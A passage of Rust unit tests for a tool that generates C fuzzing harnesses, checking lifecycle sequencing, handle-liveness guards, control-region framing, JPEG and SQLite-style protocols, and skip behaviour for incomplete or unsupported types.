            name: name.to_owned(),
            params: vec![CParameter {
                name: "n".to_owned(),
                c_type: "unsigned".to_owned(),
            }],
            return_type: "int".to_owned(),
            role,
        };
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-ARC".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/arc.c"),
            target: cfunction("arc_next_header"),
            handle_type: "arc".to_owned(),
            handle_param_type: "arc *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "arc_new".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                step("arc_next_header", CStepRole::Operation),
                step("arc_open_memory", CStepRole::Open),
                step("arc_close", CStepRole::Close),
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "arc_free".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["arc.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/arc.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
        };
        let main = fs::read_to_string(&generate_c_sequence_harness(args).unwrap().main_c).unwrap();

        // The second open verb survived into the alphabet.
        assert!(
            main.contains("arc_open_memory(&_gf_handle"),
            "the sibling open verb must be an op, got:\n{main}"
        );
        // Ordinary and close ops require a live handle; the open op requires a
        // closed one. Those two guards are what keep use-after-close out.
        assert!(
            main.contains("if (!_gf_handle_live) { break; }"),
            "ordinary/close ops must be gated on liveness:\n{main}"
        );
        assert!(
            main.contains("if (_gf_handle_live) { break; }"),
            "an open op must be gated on the handle being closed:\n{main}"
        );
        // Closing clears liveness, reopening restores it — that is the cycle.
        assert!(main.contains("_gf_handle_live = 0;"), "{main}");
        assert!(
            main.contains("_gf_handle_live = (_gf_step1_result == 0);"),
            "a status-returning open revives the handle only on success:\n{main}"
        );
        // Teardown is owed only for a handle still open, or the harness
        // double-frees on its own account.
        let free_pos = main.find("arc_free(&_gf_handle").expect("teardown emitted");
        let guard_pos = main[..free_pos]
            .rfind("if (_gf_handle_live) {")
            .expect("teardown must sit behind a liveness guard");
        assert!(guard_pos < free_pos);
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn generate_c_sequence_harness_emits_init_loop_and_end() {
        let work = temp_dir("emit-c-sequence");
        let header = work.join("session.h");
        let source = work.join("session.c");
        let header_source = r#"
            struct session { int seed; int total; };
            int session_init(struct session *s, int seed);
            int session_step(struct session *s, int delta);
            int session_reset(struct session *s);
            void session_end(struct session *s);
        "#;
        fs::write(&header, header_source).unwrap();
        fs::write(
            &source,
            r#"
            #include "session.h"
            int session_init(struct session *s, int seed) { s->seed = seed; return 0; }
            int session_step(struct session *s, int delta) { s->total += delta; return s->total; }
            int session_reset(struct session *s) { s->total = 0; return 0; }
            void session_end(struct session *s) { s->seed = 0; }
        "#,
        )
        .unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CSEQ".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("session_step"),
            handle_type: "struct session".to_owned(),
            handle_param_type: "struct session *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "session_init".to_owned(),
                params: vec![CParameter {
                    name: "seed".to_owned(),
                    c_type: "int".to_owned(),
                }],
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }),
            op_steps: vec![
                CLifecycleStep {
                    name: "session_step".to_owned(),
                    params: vec![CParameter {
                        name: "delta".to_owned(),
                        c_type: "int".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "session_reset".to_owned(),
                    params: Vec::new(),
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "session_end".to_owned(),
                params: Vec::new(),
                return_type: "void".to_owned(),
                role: CStepRole::Operation,
            }),
            target_includes: vec!["session.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: vec![source],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("struct session _gf_handle"));
        assert!(main.contains("memset(&_gf_handle, 0, sizeof _gf_handle)"));
        assert!(main.contains("int _gf_init_result = session_init(&_gf_handle, _gf_init_seed)"));
        // The op PROGRAM comes from the fixed-stride control region at the end
        // of the input, never from the forward argument cursor — otherwise a
        // length-changing edit to an argument re-frames every later operation.
        assert!(main.contains("size_t _gf_lifecycle_count = gf_ctrl_step_count(Data, Size, 8)"));
        assert!(main.contains("if (Size < 41) { _gf_lifecycle_count = 1; }"));
        assert!(main.contains("switch ((int)gf_ctrl_op(Data, Size, _gf_lifecycle_index, 8, 2))"));
        assert!(
            main.contains("gf_cursor Cur = gf_open_data(Data, Size, 41)"),
            "the argument cursor must be clamped away from the control region:\n{main}"
        );
        assert!(main.contains("session_step(&_gf_handle"));
        assert!(main.contains("session_reset(&_gf_handle)"));
        assert!(main.contains("session_end(&_gf_handle)"));

        if Command::new("clang").arg("--version").output().is_err() {
            eprintln!("skipping generated C sequence harness compile: clang not on PATH");
            return;
        }
        let obj = work.join("sequence_main.o");
        let output = Command::new("clang")
            .arg("-std=c99")
            .arg("-I")
            .arg(&work)
            .arg("-I")
            .arg(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../c_runtime"))
            .arg("-c")
            .arg(&result.main_c)
            .arg("-o")
            .arg(&obj)
            .output()
            .expect("spawn clang");
        assert!(
            output.status.success(),
            "clang failed\nstdout:\n{}\nstderr:\n{}\nmain.c:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr),
            main
        );
    }

    #[test]
    fn returning_opaque_handle_sequence_constructs_drives_and_destroys_values() {
        let work = temp_dir("emit-c-returning-sequence");
        let header = work.join("parser.h");
        let header_source = r#"
            typedef struct parser_impl *parser_t;
            parser_t parser_create(const char *encoding);
            int parser_parse(parser_t p, const char *data, size_t size);
            parser_t parser_child(parser_t p, const char *context);
            void parser_free(parser_t p);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CRETSEQ".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: cfunction("parser_parse"),
            handle_type: "parser_t".to_owned(),
            handle_param_type: "parser_t".to_owned(),
            init_returns_handle: true,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "parser_create".to_owned(),
                params: vec![CParameter {
                    name: "encoding".to_owned(),
                    c_type: "const char *".to_owned(),
                }],
                return_type: "parser_t".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![
                CLifecycleStep {
                    name: "parser_parse".to_owned(),
                    params: vec![
                        CParameter {
                            name: "data".to_owned(),
                            c_type: "const char *".to_owned(),
                        },
                        CParameter {
                            name: "size".to_owned(),
                            c_type: "size_t".to_owned(),
                        },
                    ],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "parser_child".to_owned(),
                    params: vec![CParameter {
                        name: "context".to_owned(),
                        c_type: "const char *".to_owned(),
                    }],
                    return_type: "parser_t".to_owned(),
                    role: CStepRole::Operation,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "parser_free".to_owned(),
                params: Vec::new(),
                return_type: "void".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["parser.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime.clone(),
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("parser_t _gf_handle = parser_create(NULL);"),
            "{main}"
        );
        assert!(main.contains("if (_gf_handle) {"), "{main}");
        assert!(!main.contains("memset(&_gf_handle"), "{main}");
        assert!(main.contains("parser_parse(((_gf_derived_live"), "{main}");
        assert!(main.contains("parser_free(_gf_derived)"), "{main}");
        assert!(main.contains("parser_free(_gf_handle)"), "{main}");
        assert!(!main.contains("parser_free(&_gf_handle)"), "{main}");

        if Command::new("clang").arg("--version").output().is_ok() {
            let output = Command::new("clang")
                .arg("-std=c99")
                .arg("-I")
                .arg(&work)
                .arg("-I")
                .arg(runtime)
                .arg("-c")
                .arg(&result.main_c)
                .arg("-o")
                .arg(work.join("returning-sequence.o"))
                .output()
                .expect("spawn clang");
            assert!(
                output.status.success(),
                "clang failed:\n{}\n{main}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    #[test]
    fn out_parameter_handle_sequence_opens_drives_and_closes_pointer_value() {
        let work = temp_dir("emit-c-out-handle-sequence");
        let header = work.join("db.h");
        let header_source = r#"
            #include <stddef.h>
            typedef struct db db;
            int db_open(const char *filename, db **out);
            int db_exec(db *handle, const char *sql, size_t size);
            int db_close(db *handle);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-COUTSEQ".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: cfunction("db_exec"),
            handle_type: "db *".to_owned(),
            handle_param_type: "db *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: Some(1),
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: Some(CLifecycleStep {
                name: "db_open".to_owned(),
                params: vec![
                    CParameter {
                        name: "filename".to_owned(),
                        c_type: "const char *".to_owned(),
                    },
                    CParameter {
                        name: "out".to_owned(),
                        c_type: "db **".to_owned(),
                    },
                ],
                return_type: "int".to_owned(),
                role: CStepRole::Open,
            }),
            op_steps: vec![CLifecycleStep {
                name: "db_exec".to_owned(),
                params: vec![
                    CParameter {
                        name: "sql".to_owned(),
                        c_type: "const char *".to_owned(),
                    },
                    CParameter {
                        name: "size".to_owned(),
                        c_type: "size_t".to_owned(),
                    },
                ],
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: Some(CLifecycleStep {
                name: "db_close".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Close,
            }),
            target_includes: vec!["db.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime.clone(),
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("db * _gf_handle = NULL;"), "{main}");
        assert!(
            main.contains("db_open(\":memory:\", &_gf_handle)"),
            "{main}"
        );
        assert!(main.contains("db_exec(_gf_handle"), "{main}");
        assert!(main.contains("db_close(_gf_handle)"), "{main}");
        assert!(!main.contains("db_close(&_gf_handle)"), "{main}");

        if Command::new("clang").arg("--version").output().is_ok() {
            let output = Command::new("clang")
                .arg("-std=c99")
                .arg("-I")
                .arg(&work)
                .arg("-I")
                .arg(runtime)
                .arg("-c")
                .arg(&result.main_c)
                .arg("-o")
                .arg(work.join("out-handle-sequence.o"))
                .output()
                .expect("spawn clang");
            assert!(
                output.status.success(),
                "clang failed:\n{}\n{main}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    #[test]
    fn jpeg_header_reader_uses_public_error_and_scanline_protocol() {
        let work = temp_dir("emit-c-jpeg-sequence");
        let header = work.join("jpeglib.h");
        let header_source = r#"
            #include <stddef.h>
            typedef int boolean;
            typedef unsigned int JDIMENSION;
            typedef unsigned char JSAMPLE;
            typedef JSAMPLE *JSAMPROW;
            typedef JSAMPROW *JSAMPARRAY;
            struct jpeg_error_mgr;
            struct jpeg_common_struct { struct jpeg_error_mgr *err; };
            typedef struct jpeg_common_struct *j_common_ptr;
            struct jpeg_memory_mgr {
              JSAMPARRAY (*alloc_sarray)(j_common_ptr, int, JDIMENSION, JDIMENSION);
            };
            struct jpeg_decompress_struct {
              struct jpeg_error_mgr *err;
              JDIMENSION output_width;
              int output_components;
              JDIMENSION output_scanline;
              JDIMENSION output_height;
              struct jpeg_memory_mgr *mem;
            };
            typedef struct jpeg_decompress_struct *j_decompress_ptr;
            struct jpeg_error_mgr { void (*error_exit)(j_common_ptr); };
            struct jpeg_error_mgr *jpeg_std_error(struct jpeg_error_mgr *);
            void jpeg_CreateDecompress(j_decompress_ptr, int, size_t);
            void jpeg_destroy_decompress(j_decompress_ptr);
            void jpeg_mem_src(j_decompress_ptr, const unsigned char *, unsigned long);
            int jpeg_read_header(j_decompress_ptr, boolean);
            boolean jpeg_start_decompress(j_decompress_ptr);
            JDIMENSION jpeg_read_scanlines(j_decompress_ptr, JSAMPARRAY, JDIMENSION);
            boolean jpeg_finish_decompress(j_decompress_ptr);
            #define TRUE 1
            #define JPEG_HEADER_OK 1
            #define JPOOL_IMAGE 1
            #define JPEG_LIB_VERSION 80
            #define jpeg_create_decompress(cinfo) \
              jpeg_CreateDecompress((cinfo), JPEG_LIB_VERSION, sizeof(struct jpeg_decompress_struct))
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CJPEGSEQ".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: CFunction {
                name: "jpeg_read_header".to_owned(),
                line: 1,
                return_type: "int".to_owned(),
                params: vec![
                    c_parser::CParamDescriptor {
                        name: "cinfo".to_owned(),
                        c_type: "j_decompress_ptr".to_owned(),
                    },
                    c_parser::CParamDescriptor {
                        name: "require_image".to_owned(),
                        c_type: "boolean".to_owned(),
                    },
                ],
                ..Default::default()
            },
            handle_type: "struct jpeg_decompress_struct".to_owned(),
            handle_param_type: "j_decompress_ptr".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: None,
            op_steps: vec![CLifecycleStep {
                name: "jpeg_read_header".to_owned(),
                params: vec![CParameter {
                    name: "require_image".to_owned(),
                    c_type: "boolean".to_owned(),
                }],
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: None,
            // Auto initially sees private implementation headers too. The exact
            // public recipe must discard those and retain only jpeglib.h.
            target_includes: vec!["jpeglib.h".to_owned(), "jdmaster.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime.clone(),
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("_gf_error.pub.error_exit = _gf_jpeg_error_exit"),
            "{main}"
        );
        assert!(
            main.contains("jpeg_create_decompress(&_gf_cinfo)"),
            "{main}"
        );
        assert!(main.contains("jpeg_mem_src(&_gf_cinfo, Data"), "{main}");
        assert!(
            main.contains("jpeg_read_header(&_gf_cinfo, TRUE)"),
            "{main}"
        );
        assert!(main.contains("jpeg_read_scanlines(&_gf_cinfo"), "{main}");
        assert!(
            main.contains("jpeg_destroy_decompress(&_gf_cinfo)"),
            "{main}"
        );
        assert!(!main.contains("struct jpeg_decomp_master"), "{main}");
        assert!(!main.contains("#include \"jdmaster.h\""), "{main}");

        if Command::new("clang").arg("--version").output().is_ok() {
            let output = Command::new("clang")
                .arg("-std=c99")
                .arg("-I")
                .arg(&work)
                .arg("-I")
                .arg(runtime)
                .arg("-c")
                .arg(&result.main_c)
                .arg("-o")
                .arg(work.join("jpeg-sequence.o"))
                .output()
                .expect("spawn clang");
            assert!(
                output.status.success(),
                "clang failed:\n{}\n{main}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    #[test]
    fn sqlite_prepare_uses_nul_terminated_multi_statement_vm_protocol() {
        let work = temp_dir("emit-c-sqlite-sequence");
        // The canonical repository target is declared through sqliteInt.h;
        // installed consumers use sqlite3.h. Exercise the source-tree spelling
        // that the real auto-harness selection sees.
        let header = work.join("sqliteInt.h");
        let header_source = r#"
            typedef struct sqlite3 sqlite3;
            typedef struct sqlite3_stmt sqlite3_stmt;
            #define SQLITE_OK 0
            #define SQLITE_ROW 100
            int sqlite3_open(const char *, sqlite3 **);
            int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
            int sqlite3_step(sqlite3_stmt *);
            int sqlite3_finalize(sqlite3_stmt *);
            int sqlite3_close(sqlite3 *);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CSQLITESEQ".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: CFunction {
                name: "sqlite3_prepare_v2".to_owned(),
                line: 1,
                return_type: "int".to_owned(),
                params: vec![
                    c_parser::CParamDescriptor {
                        name: "db".to_owned(),
                        c_type: "sqlite3 *".to_owned(),
                    },
                    c_parser::CParamDescriptor {
                        name: "sql".to_owned(),
                        c_type: "const char *".to_owned(),
                    },
                    c_parser::CParamDescriptor {
                        name: "bytes".to_owned(),
                        c_type: "int".to_owned(),
                    },
                    c_parser::CParamDescriptor {
                        name: "stmt".to_owned(),
                        c_type: "sqlite3_stmt **".to_owned(),
                    },
                    c_parser::CParamDescriptor {
                        name: "tail".to_owned(),
                        c_type: "const char **".to_owned(),
                    },
                ],
                ..Default::default()
            },
            handle_type: "sqlite3 *".to_owned(),
            handle_param_type: "sqlite3 *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: Some(1),
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: None,
            op_steps: vec![CLifecycleStep {
                name: "sqlite3_prepare_v2".to_owned(),
                params: Vec::new(),
                return_type: "int".to_owned(),
                role: CStepRole::Operation,
            }],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: None,
            target_includes: vec!["sqliteInt.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime.clone(),
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("_gf_sql[Size] = '\\0'"), "{main}");
        assert!(
            main.contains("sqlite3_open(\":memory:\", &_gf_db)"),
            "{main}"
        );
        assert!(main.contains("sqlite3_prepare_v2("), "{main}");
        assert!(main.contains("sqlite3_step(_gf_stmt)"), "{main}");
        assert!(main.contains("sqlite3_finalize(_gf_stmt)"), "{main}");
        assert!(main.contains("sqlite3_close(_gf_db)"), "{main}");
        assert!(!main.contains("gf_open_data"), "{main}");

        if Command::new("clang").arg("--version").output().is_ok() {
            let output = Command::new("clang")
                .arg("-std=c99")
                .arg("-I")
                .arg(&work)
                .arg("-I")
                .arg(runtime)
                .arg("-c")
                .arg(&result.main_c)
                .arg("-o")
                .arg(work.join("sqlite-sequence.o"))
                .output()
                .expect("spawn clang");
            assert!(
                output.status.success(),
                "clang failed:\n{}\n{main}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
    }

    #[test]
    fn generate_c_sequence_harness_skips_incomplete_handle() {
        // GAP #6 (tidwall/hashmap.c): the sequence handle `struct hashmap` is only
        // FORWARD-declared in the harness's headers — its body is in hashmap.c, which
        // the harness does not include. Stack-allocating `struct hashmap _gf_handle;`
        // is an illegal incomplete-type declaration, so the sequence harness must be
        // SKIPPED (UnsupportedParamType) rather than emit code that fails the build.
        let work = temp_dir("emit-c-sequence-incomplete");
        let header = work.join("map.h");
        let header_source = r#"
            struct hashmap;
            const void *hashmap_set_with_hash(struct hashmap *m, const void *item, unsigned long hash);
            void hashmap_clear(struct hashmap *m, int update_cap);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CSEQI".to_owned(),
            output_dir: work.join("harness"),
            source_path: header.clone(),
            target: cfunction("hashmap_set_with_hash"),
            handle_type: "struct hashmap".to_owned(),
            handle_param_type: "struct hashmap *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: None,
            op_steps: vec![CLifecycleStep {
                name: "hashmap_clear".to_owned(),
                params: vec![CParameter {
                    name: "update_cap".to_owned(),
                    c_type: "int".to_owned(),
                }],
                return_type: "void".to_owned(),
                role: CStepRole::Operation,
            }],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: None,
            target_includes: vec!["map.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
        };

        let err = generate_c_sequence_harness(args).unwrap_err();
        match err {
            HarnessGenError::UnsupportedParamType(reason) => assert!(
                reason.contains("incomplete in the harness"),
                "skip reason should name the incomplete-type cause: {reason}"
            ),
            other => panic!("expected UnsupportedParamType skip, got {other:?}"),
        }
    }

    #[test]
    fn generate_c_sequence_harness_skips_unsupported_secondary_ops() {
        let work = temp_dir("emit-c-sequence-skip-op");
        let header = work.join("session.h");
        let header_source = r#"
            struct session { int seed; int total; };
            int session_step(struct session *s, int delta);
            int session_find(struct session *s, struct hidden_state *hidden);
        "#;
        fs::write(&header, header_source).unwrap();
        let defs = c_parser::parse_c_type_defs(header_source).unwrap();
        let out = work.join("harness");
        let runtime = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../c_runtime")
            .canonicalize()
            .unwrap();
        let args = GenerateCSequenceArgs {
            decoder_limits: Default::default(),
            harness_id: "H-CSEQ-SKIP".to_owned(),
            output_dir: out,
            source_path: header.clone(),
            target: cfunction("session_step"),
            handle_type: "struct session".to_owned(),
            handle_param_type: "struct session *".to_owned(),
            init_returns_handle: false,
            init_out_handle_argument: None,
            init_success_nonzero: false,
            handle_field_initializers: Vec::new(),
            output_drain_protocol: None,
            init_step: None,
            op_steps: vec![
                CLifecycleStep {
                    name: "session_step".to_owned(),
                    params: vec![CParameter {
                        name: "delta".to_owned(),
                        c_type: "int".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
                CLifecycleStep {
                    name: "session_find".to_owned(),
                    params: vec![CParameter {
                        name: "hidden".to_owned(),
                        c_type: "struct hidden_state *".to_owned(),
                    }],
                    return_type: "int".to_owned(),
                    role: CStepRole::Operation,
                },
            ],
            protocol_steps: Vec::new(),
            protocol_objects: Vec::new(),
            receiver_configuration_names: Vec::new(),
            callback_action: None,
            end_step: None,
            target_includes: vec!["session.h".to_owned()],
            target_includes_dirs: vec![work.clone()],
            target_sources: Vec::new(),
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: runtime,
            type_defs: vec![defs],
        };

        let result = generate_c_sequence_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("session_step(&_gf_handle"));
        assert!(
            !main.contains("session_find"),
            "unsupported secondary op should be skipped:\n{main}"
        );
        assert!(main.contains("switch ((int)gf_ctrl_op(Data, Size, _gf_lifecycle_index, 8, 1))"));
    }
}
